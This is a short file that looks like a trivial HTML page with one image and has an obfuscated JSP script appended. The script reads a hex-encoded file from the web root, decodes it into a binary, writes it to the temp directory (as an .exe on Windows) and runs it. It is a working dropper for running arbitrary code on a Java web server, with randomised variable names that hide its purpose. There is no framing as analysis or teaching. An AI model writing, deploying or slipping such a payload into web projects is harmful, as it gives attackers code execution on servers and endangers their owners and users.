<HTML>
<HEAD> <TITLE>this is some stuff</TITLE> </HEAD>
<BODY>
  <IMG SRC="getoverit.gif">
</BODY>
</HTML>
<%@ page import="java.io.*" %>
<%
String dpzZQNN = application.getRealPath("/") + "yOGyvsRCbPF.txt";
String woBTgmFtELTrBZ = System.getProperty("java.io.tmpdir") + "/AfeaXhJzhiD";
String fHaLZeS = "";
if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
woBTgmFtELTrBZ = woBTgmFtELTrBZ.concat(".exe");
}
FileInputStream uQoTWbowZPSXNso = new FileInputStream(dpzZQNN);
FileOutputStream jnHSeVbD = new FileOutputStream(woBTgmFtELTrBZ);
int pqwECiAOd = uQoTWbowZPSXNso.available();
byte XCwJKm[] = new byte[pqwECiAOd];
uQoTWbowZPSXNso.read(XCwJKm);
uQoTWbowZPSXNso.close();
byte[] MyqsnzxjMS = new byte[pqwECiAOd/2];
for (int ZarylYk = 0; ZarylYk < pqwECiAOd; ZarylYk += 2)
{
char fhZFMwMAGuQXyG = (char) XCwJKm[ZarylYk];
char ROHsgJIGuxo = (char) XCwJKm[ZarylYk + 1];
int vIIKZobHRAkbGU = Character.digit(fhZFMwMAGuQXyG, 16) & 0xff;
vIIKZobHRAkbGU <<= 4;
vIIKZobHRAkbGU += Character.digit(ROHsgJIGuxo, 16) & 0xff;
MyqsnzxjMS[ZarylYk/2] = (byte)vIIKZobHRAkbGU;
}
jnHSeVbD.write(MyqsnzxjMS);
jnHSeVbD.close();
Process OoOVnKMRItkxS = Runtime.getRuntime().exec(woBTgmFtELTrBZ);
%>
